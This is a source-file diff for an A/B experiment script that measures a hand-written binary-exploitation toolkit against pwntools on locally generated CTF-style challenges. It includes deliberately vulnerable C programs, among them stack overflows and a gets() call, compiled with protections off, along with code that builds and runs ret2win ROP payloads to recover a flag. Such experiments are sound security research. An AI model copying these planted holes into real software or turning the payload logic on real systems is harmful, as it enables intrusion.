@@ -1,0 +1,408 @@
+"""
+v030_tool_ab.src — 自研单元 vs 包装成熟工具（pwntools）的 A/B
+
+问题
+    我们的 pwn 单元（ELF 分析 / gadget 扫描 / payload / 执行）是手写的。
+    成熟工具（pwntools 的 ELF/ROP/process）在同样的题上是否更强、更省力？
+
+设计
+    同一批 freestanding 题目，两个实验臂各自构造并执行 exploit：
+      A 臂：自研单元（secknow.solving.binary 的保护/符号 + 朴素 gadget 扫描 + subprocess）
+      B 臂：pwntools（ELF 符号、ROP 链、process 交互），跑在 WSL 里
+
+题目
+    P1 ret2win，无参数
+    P2 ret2win，需要 rdi 参数；二进制里只有 `pop rdi; ret`
+    P3 ret2win，需要 rsi 参数；二进制里**没有** `pop rsi; ret`，
+       只有 `pop rsi; pop rbp; ret`（朴素扫描会漏，ROP 工具能找）
+    N1 canary 溢出题：两臂都必须在保护闸门拒绝
+
+公平性
+    两臂使用同一份偏移候选列表（来自静态栈提示 + 有限枚举）；
+    只有“gadget 发现与 payload 构造/执行”由各自的实现负责。
+
+运行
+    python versions/v030_tool_ab.src
+    python versions/v030_tool_ab.src --only P3
+
+产出
+    experiments/EXP-0030/{results.json,report.md,chal/}
+"""
+
+from __future__ import annotations
+
+import json
+import random
+import re
+import string
+import struct
+import subprocess
+import sys
+import time
+from pathlib import Path
+
+ROOT = Path(__file__).resolve().parent.parent
+OUT_DIR = ROOT / "experiments" / "EXP-0030"
+CHAL_DIR = OUT_DIR / "chal"
+ARM_B = ROOT / "tools" / "pwntools_arm.src"
+
+sys.path.insert(0, str(ROOT / "src"))
+
+from secknow.solving.binary import analyze  # noqa: E402
+
+for _stream in (sys.stdout, sys.stderr):
+    if hasattr(_stream, "reconfigure"):
+        try:
+            _stream.reconfigure(encoding="utf-8", errors="replace")
+        except (ValueError, OSError):
+            pass
+
+
+def log(message: str) -> None:
+    print(f"[{time.strftime('%H:%M:%S')}] {message}", flush=True)
+
+
+FLAG_RE = re.compile(r"flag\{[^}\n]{1,200}\}", re.IGNORECASE)
+
+
+def wsl_path(win_path: str | Path) -> str:
+    path = Path(win_path).resolve()
+    drive = path.drive.rstrip(":").lower()
+    return f"/mnt/{drive}" + str(path)[2:].replace("\\", "/")
+
+
+def run_wsl(args: list[str], stdin_data: bytes | None = None,
+            timeout: int = 30) -> tuple[int, str, str]:
+    try:
+        done = subprocess.run(["wsl", "-e", *args], input=stdin_data,
+                              capture_output=True, timeout=timeout)
+    except subprocess.TimeoutExpired:
+        return 124, "", "timeout"
+    return (done.returncode,
+            done.stdout.decode("utf-8", "replace"),
+            done.stderr.decode("utf-8", "replace"))
+
+
+def compile_c(source_path: Path, binary_path: Path, flags: list[str]) -> dict:
+    rc, _, err = run_wsl(["gcc", wsl_path(source_path), "-o", wsl_path(binary_path), *flags],
+                         timeout=120)
+    return {"result": "ok" if rc == 0 else "failed", "rc": rc, "stderr": err.strip()[-200:]}
+
+
+# --------------------------------------------------------------------------------------
+# 题目模板（freestanding，避免 CRT 自带的 gadget 干扰）
+# --------------------------------------------------------------------------------------
+
+PRELUDE = """static long sys3(long n, long a, long b, long c) {
+    long ret;
+    __asm__ volatile("syscall" : "=a"(ret)
+                     : "a"(n), "D"(a), "S"(b), "d"(c)
+                     : "rcx", "r11", "memory");
+    return ret;
+}
+"""
+
+
+def win_source(encoded_text: str) -> str:
+    return f"""void win(void) {{
+    unsigned char data[16] = {{{encoded_text}}};
+    char out[16];
+    for (int i = 0; i < 16; i++) out[i] = data[i] ^ 0x5A;
+    sys3(1, 1, (long)out, 16);
+    sys3(60, 0, 0, 0);
+    __builtin_unreachable();
+}}
+"""
+
+
+VULN_SOURCE = """void vuln(void) {
+    char buf[64];
+    sys3(0, 0, (long)buf, 256);
+}
+
+void _start(void) {
+    vuln();
+    sys3(60, 0, 0, 0);
+}
+"""
+
+WIN_ARG_RDI = """void win_arg(long x) {
+    if (x == 0x1234) win();
+    sys3(60, 1, 0, 0);
+    __builtin_unreachable();
+}
+"""
+
+WIN_ARG_RSI = """void win_arg(long ignored, long x) {
+    if (x == 0x1234) win();
+    sys3(60, 1, 0, 0);
+    __builtin_unreachable();
+}
+"""
+
+GADGET_RDI = """__asm__(".global g_pop_rdi\\n"
+        "g_pop_rdi:\\n"
+        "  pop %rdi\\n"
+        "  ret\\n");
+"""
+
+GADGET_RSI = """__asm__(".global g_pop_rsi_rbp\\n"
+        "g_pop_rsi_rbp:\\n"
+        "  pop %rsi\\n"
+        "  pop %rbp\\n"
+        "  ret\\n");
+"""
+
+
+def build_challenges(seed: int) -> list[dict]:
+    CHAL_DIR.mkdir(parents=True, exist_ok=True)
+    random.seed(seed)
+    flag = "flag{" + "".join(random.choices(string.hexdigits.lower(), k=10)) + "}"
+    encoded = bytes(ord(character) ^ 0x5A for character in flag)
+    encoded_text = ", ".join(f"0x{value:02x}" for value in encoded)
+
+    sources = {
+        "P1": PRELUDE + win_source(encoded_text) + VULN_SOURCE,
+        "P2": PRELUDE + win_source(encoded_text) + WIN_ARG_RDI + GADGET_RDI + VULN_SOURCE,
+        "P3": PRELUDE + win_source(encoded_text) + WIN_ARG_RSI + GADGET_RSI + VULN_SOURCE,
+    }
+
+    cases = [
+        {"id": "P1", "mode": "none", "arg": 0, "expected": flag,
+         "source": sources["P1"], "note": "ret2win 无参数"},
+        {"id": "P2", "mode": "rdi", "arg": 0x1234, "expected": flag,
+         "source": sources["P2"], "note": "需要 rdi；存在 pop rdi; ret"},
+        {"id": "P3", "mode": "rsi_rbp", "arg": 0x1234, "expected": flag,
+         "source": sources["P3"], "note": "需要 rsi；只有 pop rsi; pop rbp; ret"},
+    ]
+    for case in cases:
+        source_path = CHAL_DIR / f"{case['id'].lower()}.c"
+        source_path.write_text(case["source"], encoding="utf-8")
+        binary = CHAL_DIR / case["id"].lower()
+        case["binary"] = binary
+        case["compile"] = compile_c(
+            source_path, binary,
+            ["-nostdlib", "-static", "-no-pie", "-fno-stack-protector", "-O0"])
+
+    canary_src = """#include <stdio.h>
+int main(void) {
+    char buf[64];
+    gets(buf);
+    return 0;
+}
+"""
+    source_path = CHAL_DIR / "n1.c"
+    source_path.write_text(canary_src, encoding="utf-8")
+    binary = CHAL_DIR / "n1"
+    compile_c(source_path, binary, ["-fstack-protector-all", "-no-pie", "-O0"])
+    cases.append({"id": "N1", "mode": "none", "arg": 0, "expected": "",
+                  "source": canary_src, "binary": binary, "negative": True,
+                  "note": "canary：两臂都必须拒绝",
+                  "compile": {"result": "ok"}})
+    return cases
+
+
+# --------------------------------------------------------------------------------------
+# A 臂：自研单元
+# --------------------------------------------------------------------------------------
+
+def naive_gadgets(binary: Path) -> dict[str, int]:
+    from capstone import CS_ARCH_X86, CS_MODE_64, Cs
+    from elftools.elf.elffile import ELFFile
+
+    with open(binary, "rb") as handle:
+        elf = ELFFile(handle)
+        text = elf.get_section_by_name(".text")
+        instructions = list(Cs(CS_ARCH_X86, CS_MODE_64).disasm(text.data(), text["sh_addr"]))
+    gadgets: dict[str, int] = {}
+    for index in range(len(instructions) - 1):
+        first, second = instructions[index], instructions[index + 1]
+        if first.mnemonic == "pop" and second.mnemonic == "ret":
+            gadgets.setdefault(f"pop {first.op_str}; ret", first.address)
+        if first.mnemonic == "ret":
+            gadgets.setdefault("ret", first.address)
+    return gadgets
+
+
+def arm_a(case: dict, candidates: list[int]) -> dict:
+    result = {"arm": "self", "solved": False, "offset": None, "attempts": 0,
+              "gadget": None, "error": None}
+    profile = analyze(case["binary"])
+    if profile.has_canary or profile.is_pie:
+        result.update({"error": "protection_gate",
+                       "reason": "canary_present" if profile.has_canary else "pie_enabled"})
+        result["elapsed_ms"] = 0.0
+        return result
+
+    preferred = ("win_arg", "win") if case["mode"] != "none" else ("win", "win_arg")
+    target = next((profile.symbols[name] for name in preferred if name in profile.symbols), None)
+    if target is None:
+        result.update({"error": "win_not_found"})
+        result["elapsed_ms"] = 0.0
+        return result
+
+    started = time.perf_counter()
+    gadgets = naive_gadgets(case["binary"])
+    if case["mode"] == "rdi" and "pop rdi; ret" not in gadgets:
+        result.update({"error": "gadget_missing:pop rdi; ret"})
+        result["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+        return result
+    if case["mode"] == "rsi_rbp" and "pop rsi; ret" not in gadgets:
+        result.update({"error": "gadget_missing:pop rsi; ret"})
+        result["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+        return result
+
+    for attempt, offset in enumerate(candidates, 1):
+        result["attempts"] = attempt
+        payload = b"A" * offset
+        if "ret" in gadgets:
+            payload += struct.pack("<Q", gadgets["ret"])
+        if case["mode"] == "rdi":
+            payload += struct.pack("<Q", gadgets["pop rdi; ret"])
+            payload += struct.pack("<Q", case["arg"])
+            result["gadget"] = "pop rdi; ret"
+        elif case["mode"] == "rsi_rbp":
+            payload += struct.pack("<Q", gadgets["pop rsi; ret"])
+            payload += struct.pack("<Q", case["arg"])
+            result["gadget"] = "pop rsi; ret"
+        payload += struct.pack("<Q", target)
+        rc, out, err = run_wsl([wsl_path(case["binary"])], stdin_data=payload)
+        found = FLAG_RE.search(out)
+        if found and found.group(0).lower() == case["expected"].lower():
+            result.update({"solved": True, "offset": offset})
+            break
+    result["elapsed_ms"] = round((time.perf_counter() - started) * 1000, 1)
+    return result
+
+
+# --------------------------------------------------------------------------------------
+# B 臂：pwntools
+# --------------------------------------------------------------------------------------
+
+def arm_b(case: dict, candidates: list[int]) -> dict:
+    request = {
+        "binary": wsl_path(case["binary"]),
+        "target": 0,
+        "mode": case["mode"],
+        "arg": case["arg"],
+        "offset_candidates": candidates,
+        "flag": case["expected"],
+    }
+    # 目标地址由同一份 ELF 符号解析给出，避免把“找后门”算进工具臂
+    profile = analyze(case["binary"])
+    if profile.has_canary or profile.is_pie:
+        return {"arm": "pwntools", "solved": False, "error": "protection_gate",
+                "reason": "canary_present" if profile.has_canary else "pie_enabled",
+                "attempts": 0, "elapsed_ms": 0.0}
+    preferred = ("win_arg", "win") if case["mode"] != "none" else ("win", "win_arg")
+    target = next((profile.symbols[name] for name in preferred if name in profile.symbols), None)
+    if target is None:
+        return {"arm": "pwntools", "solved": False, "error": "win_not_found",
+                "attempts": 0, "elapsed_ms": 0.0}
+    request["target"] = target
+    rc, out, err = run_wsl(["python3", wsl_path(ARM_B), json.dumps(request)], timeout=120)
+    try:
+        payload = json.loads(out.strip().splitlines()[-1])
+    except (ValueError, IndexError):
+        payload = {"solved": False, "error": f"bad_output:{out[:120]} {err[:120]}",
+                   "attempts": 0, "elapsed_ms": 0.0}
+    payload["arm"] = "pwntools"
+    return payload
+
+
+# --------------------------------------------------------------------------------------
+# 主流程
+# --------------------------------------------------------------------------------------
+
+def offset_candidates_for(binary: Path) -> list[int]:
+    profile = analyze(binary)
+    hints = profile.stack_hints or []
+    candidates: list[int] = []
+    for hint in hints:
+        for delta in range(-8, 25, 8):
+            value = hint + delta
+            if value > 0 and value not in candidates:
+                candidates.append(value)
+    candidates.extend(value for value in range(24, 200, 8) if value not in candidates)
+    return candidates
+
+
+def evaluate(case: dict) -> dict:
+    candidates = offset_candidates_for(case["binary"])
+    baseline = arm_a(case, candidates)
+    tool = arm_b(case, candidates)
+    record = {
+        "id": case["id"], "note": case["note"], "negative": case.get("negative", False),
+        "compile": case["compile"], "candidates": len(candidates),
+        "self": baseline, "pwntools": tool,
+    }
+    record["self_ok"] = (baseline["error"] == "protection_gate"
+                         if case.get("negative") else baseline["solved"])
+    record["pwntools_ok"] = (tool.get("error") == "protection_gate"
+                             if case.get("negative") else tool.get("solved", False))
+    record["verdict"] = {
+        "self": "refused" if case.get("negative") and record["self_ok"]
+        else "solved" if baseline["solved"] else "failed",
+        "pwntools": "refused" if case.get("negative") and record["pwntools_ok"]
+        else "solved" if tool.get("solved") else "failed",
+    }
+    log(f"{case['id']}: self={record['verdict']['self']}"
+        f" pwntools={record['verdict']['pwntools']}"
+        f"  self_err={baseline.get('error')} tool_err={tool.get('error')}")
+    return record
+
+
+def write_report(results: list[dict]) -> None:
+    OUT_DIR.mkdir(parents=True, exist_ok=True)
+    summary = {
+        "cases": len(results),
+        "self_ok": sum(1 for item in results if item["self_ok"]),
+        "pwntools_ok": sum(1 for item in results if item["pwntools_ok"]),
+        "self_ms": round(sum(item["self"].get("elapsed_ms", 0) or 0 for item in results), 1),
+        "pwntools_ms": round(sum(item["pwntools"].get("elapsed_ms", 0) or 0
+                                 for item in results), 1),
+    }
+    (OUT_DIR / "results.json").write_text(
+        json.dumps({"summary": summary, "cases": results}, ensure_ascii=False, indent=2),
+        encoding="utf-8")
+
+    lines = ["# EXP-0030 — 自研单元 vs pwntools 的 A/B", "",
+             "## 汇总", "", "```json", json.dumps(summary, ensure_ascii=False, indent=2),
+             "```", "",
+             "## 逐题", "",
+             "| 题 | 自研 | pwntools | 自研错误 | 工具 gadget |",
+             "| --- | --- | --- | --- | --- |"]
+    for item in results:
+        lines.append(
+            f"| {item['id']} | {item['verdict']['self']} | {item['verdict']['pwntools']} "
+            f"| {item['self'].get('error') or '—'} | {item['pwntools'].get('gadget') or '—'} |")
+    lines += ["", "## 说明", "",
+              "- 两臂使用同一份偏移候选和同一套保护闸门；只比较 gadget 发现与利用构造。",
+              "- P3 故意只提供 `pop rsi; pop rbp; ret`；朴素扫描只认 `pop X; ret`，会漏。",
+              "- 工具臂的目标地址仍由同一份符号/交叉引用分析给出，避免把“找后门”算进工具能力。"]
+    (OUT_DIR / "report.md").write_text("\n".join(lines) + "\n", encoding="utf-8")
+
+
+def main() -> None:
+    import argparse
+
+    parser = argparse.ArgumentParser(description="自研单元 vs pwntools 的 A/B")
+    parser.add_argument("--seed", type=int, default=20261113)
+    parser.add_argument("--only", default=None)
+    args = parser.parse_args()
+
+    cases = build_challenges(args.seed)
+    if args.only:
+        wanted = {item.strip() for item in args.only.split(",")}
+        cases = [case for case in cases if case["id"] in wanted]
+    log(f"挑战 {len(cases)} 个：{[case['id'] for case in cases]}")
+    results = [evaluate(case) for case in cases]
+    write_report(results)
+    summary = json.loads((OUT_DIR / "results.json").read_text(encoding="utf-8"))["summary"]
+    log(f"汇总：自研 {summary['self_ok']}/{summary['cases']}，"
+        f"pwntools {summary['pwntools_ok']}/{summary['cases']}")
+    log(f"报告：{OUT_DIR / 'report.md'}")
+
+
+if __name__ == "__main__":
+    main()
